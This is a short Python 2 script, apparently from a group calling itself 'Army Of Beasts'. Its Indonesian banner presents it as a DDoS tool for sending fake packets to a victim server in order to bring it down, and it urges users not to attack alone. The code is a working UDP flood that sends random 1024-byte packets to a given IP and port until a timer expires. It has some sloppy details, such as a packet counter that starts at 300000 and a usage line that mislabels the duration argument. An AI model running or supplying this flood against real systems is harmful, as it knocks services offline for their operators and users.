#!/usr/bin/python2
# coding=utf-8


import time,socket,sys,os,re,random,math,getopt,string


#usage#
def usage():
    print "\033[1;91m"
    print "#####################################"
    print "              ATTACK-AOB             "
    print "                                     "
    print "                  TEAM               "
    print "             Army Of Beasts          "
    print "#####################################"
    
    print "ATTACK-AOB adalah tool ddos-attack yang bertunjuan untuk mengirim packet atau email palsu ke server korban."
    print 
    print "WARNING"
    print "untuk membuat server korban menjadi down"
    print "jangan melakukan serangan sendirian!"
    print
    print
    print
    print "cara pakai"
    print "python2 attack.py <ip> <port> <packet>"

def flood (victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 300000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "menyerang %s paket terkirim %s at ke port %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
print "\033[32m"
if __name__ == '__main__':
    main()

